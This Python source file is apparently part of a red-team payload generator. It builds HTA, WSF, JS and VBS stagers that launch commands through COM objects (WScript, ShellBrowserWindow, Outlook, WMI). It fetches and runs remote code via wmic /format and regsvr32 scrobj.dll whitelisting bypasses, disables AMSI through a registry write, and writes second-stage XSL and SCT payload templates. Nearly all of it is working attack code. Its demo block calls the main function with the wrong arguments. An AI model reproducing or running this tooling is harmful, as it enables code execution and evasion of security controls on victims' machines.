#!/usr/bin/python

def create_com_stager(technique, filetype, awlurl, outputfile, sspayload, amsi):
	
	output = ""
	cmd = ""

	wmic_cmd_js = "wmic process get brief /format:\\\"%s\\\"" % (awlurl)
	wmic_cmd_vbs = "wmic process get brief /format:\"\"%s\"\"" % (awlurl)
	regsvr32_cmd = "regsvr32 /s /u /n /i:%s scrobj.dll" % (awlurl)

	if("sct" in outputfile):
		cmd = regsvr32_cmd
	elif("hta" in filetype or "vbs" in filetype or "vbe" in filetype):
		cmd = wmic_cmd_vbs
	else:
		cmd = wmic_cmd_js

	wsh_vbs = """Dim obj
Set obj = GetObject("new:72C24DD5-D70A-438B-8A42-98424B88AFB8")
obj.Run "%s", 0""" % (cmd)

	wsh_js = """var obj = GetObject("new:72C24DD5-D70A-438B-8A42-98424B88AFB8")
obj.Run("%s")""" % (cmd)

	shellbrowser_vbs = """Set obj = GetObject("new:C08AFD90-F2A1-11D1-8455-00A0C91F3880")
obj.Document.Application.ShellExecute "%s",Null,"C:\\Windows\\System32",Null,0
""" % (cmd)

	shellbrowser_js = """var obj = GetObject("new:C08AFD90-F2A1-11D1-8455-00A0C91F3880");
obj.Document.Application.ShellExecute("%s",null,"C:\\Windows\\System32",null,0);
""" % (cmd)
	
	outlook_vbs = """Set obj = GetObject("new:0006F03A-0000-0000-C000-000000000046")
obj.CreateObject("WScript.Shell").Run("%s")""" % (cmd)

	outlook_js = """var obj = GetObject("new:0006F03A-0000-0000-C000-000000000046");
obj.CreateObject("WScript.Shell").Run("%s");""" % (cmd)

	wmi_vbs = """Set objWMIService = GetObject("winmgmts:\\\\\\\\.\\\\root\\\\cimv2")
Set objStartUp = objWMIService.Get("Win32_ProcessStartup")
Set objProc = objWMIService.Get("Win32_Process")
Set procStartConfig = objStartUp.SpawnInstance_
procStartConfig.ShowWindow = 0
objProc.Create "%s", Null, procStartConfig, intProcessID""" % (cmd)

	wmi_js = """var objWMIService = GetObject("winmgmts:\\\\\\\\.\\\\root\\\\cimv2");
var objStartUp = objWMIService.Get("Win32_ProcessStartup");
var objProc = objWMIService.Get("Win32_Process");
var procStartConfig = objStartUp.SpawnInstance_();
procStartConfig.ShowWindow = 0;
objProc.Create("%s", null, procStartConfig, 0);
    """ % (cmd)

	xsl_remote_js = """var xml = new ActiveXObject("Microsoft.XMLDOM");
xml.async = false;
var xsl = xml;
xsl.load(\"%s\");
xml.transformNode(xsl);""" % (awlurl)

	xsl_remote_vbs = """Set xml = CreateObject("Microsoft.XMLDOM")
xml.async = false
Set xsl = xml
xsl.load \"%s\"
xml.transformNode xsl""" % (awlurl)

	js_bypass = """\nvar sh = new ActiveXObject('WScript.Shell');
var key = "HKCU\\\\Software\\\\Microsoft\\\\Windows Script\\\\Settings\\\\AmsiEnable";
try{
	var AmsiEnable = sh.RegRead(key);
	if(AmsiEnable!=0){
	throw new Error(1, '');
	}
}catch(e){
	sh.RegWrite(key, 0, "REG_DWORD"); // neuter AMSI
}\n\n"""

###### Outlook.CreateObject Technique

	if(technique=="outlook"):
		if(filetype == "hta"):
			output = """<html><head><script language="vBScRiPT">
	%s
	Execute plain
	self.close
	</script></head></html>
	""" % (outlook_vbs)
		elif("wsf" in filetype):
			output = """<?XML Version="1.0" ?>
<?job error="true" debug="true"?>
<package>
<job id="JS Code">
<script language="JScript">
<![CDATA[
%s
]]>
</script>
</job>
</package>""" % (outlook_js)
		elif("js" in filetype):
			output = outlook_js
		elif("vbs" in filetype or "vbe" in filetype):
			output = outlook_vbs


#### WScript Technique

	if(technique=="wscript"):
		if(filetype == "hta"):
			output = """<html><head><script language="vBScRiPT">
	%s
	Execute plain
	self.close
	</script></head></html>
	""" % (wsh_vbs)
		elif("wsf" in filetype):
			output = """<?XML Version="1.0" ?>
<?job error="true" debug="true"?>
<package>
<job id="JS Code">
<script language="JScript">
<![CDATA[
%s
]]>
</script>
</job>
</package>""" % (wsh_js)
		elif("js" in filetype):
			output = wsh_js
		elif("vbs" in filetype or "vbe" in filetype):
			output = wsh_vbs

###### ShellBrowserWin Technique

	if(technique=="shellbrowserwin"):
		if(filetype == "hta"):
			output = """<html><head><script language="vBScRiPT">
	%s
	Execute plain
	self.close
	</script></head></html>
	""" % (shellbrowser_vbs)
		elif("wsf" in filetype):
			output = """<?XML Version="1.0" ?>
<?job error="true" debug="true"?>
<package>
<job id="JS Code">
<script language="JScript">
<![CDATA[
%s
]]>
</script>
</job>
</package>""" % (shellbrowser_js)
		elif("js" in filetype):
			output = shellbrowser_js
		elif("vbs" in filetype or "vbe" in filetype):
			output = shellbrowser_vbs

########## WMI Technique

	if(technique=="wmi"):
		if(filetype == "hta"):
			output = """<html><head><script language="vBScRiPT">
	%s
	Execute plain
	self.close
	</script></head></html>
	""" % (wmi_vbs)
		elif("wsf" in filetype):
			output = """<?XML Version="1.0" ?>
<?job error="true" debug="true"?>
<package>
<job id="JS Code">
<script language="JScript">
<![CDATA[
%s
]]>
</script>
</job>
</package>""" % (wmi_js)
		elif("js" in filetype):
			output = wmi_js
		elif("vbs" in filetype or "vbe" in filetype):
			output = wmi_vbs

##### XSL Remote

	if(technique=="xslremote"):
		if(filetype == "hta"):
			if(amsi):
				xsl_remote_js = js_bypass + xsl_remote_js

			output = """<HTML>
<HEAD>
</HEAD>
<BODY>
<script language="javascript" >
%s
self.close();
</script>
</body>
</html>
	""" % (xsl_remote_js)
		elif("wsf" in filetype):
			output = """<?XML Version="1.0" ?>
<?job error="true" debug="true"?>
<package>
<job id="JS Code">
<script language="JScript">
<![CDATA[
%s
]]>
</script>
</job>
</package>""" % (xsl_remote_js)
		elif("js" in filetype):
			if(amsi):
				output = js_bypass + xsl_remote_js
			else:
				output = xsl_remote_js
		elif("vbs" in filetype or "vbe" in filetype):
			output = xsl_remote_vbs

	# Create a 2nd stage payload
	create_awl_payload(outputfile, sspayload)

	return output

def create_awl_payload(outputfile, sspayload):
	output = ""

	xsl_template = """<?xml version='1.0'?>
<xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:msxsl="urn:schemas-microsoft-com:xslt"
xmlns:sharp="http://sharp.shooter/mynamespace">
 
<msxsl:script language="JScript" implements-prefix="sharp">
   function shooter(nodelist) {
<![CDATA[
%s
]]>
   return nodelist.nextNode().xml;
 
   }
</msxsl:script>
<xsl:template match="/">
   <xsl:value-of select="sharp:shooter(.)"/>
</xsl:template>
</xsl:stylesheet>""" % (sspayload)

	sct_template = """<?XML version="1.0"?>
<scriptlet>
<registration 
    progid="ss"
    classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >
	<script language="JScript">
		<![CDATA[ %s ]]>
</script>
</registration>
</scriptlet>""" % (sspayload)

	if("xsl" in outputfile):
		output = xsl_template
	else: output = sct_template

	out = open(outputfile, 'w')
	out.write(output)
	out.close()
	print("\033[1;34m[*]\033[0;0m Written payload to %s" % outputfile)
        
	return output

if __name__ == "__main__":
	technique = "xslremote"
	filetype = "wsf"
	awl = "wmic"
	awurl = "http://www.google.com/test.xsl"
	
	out = create_com_stager(technique, filetype, awl, awurl)
	print(out)
	#create_awl_payload()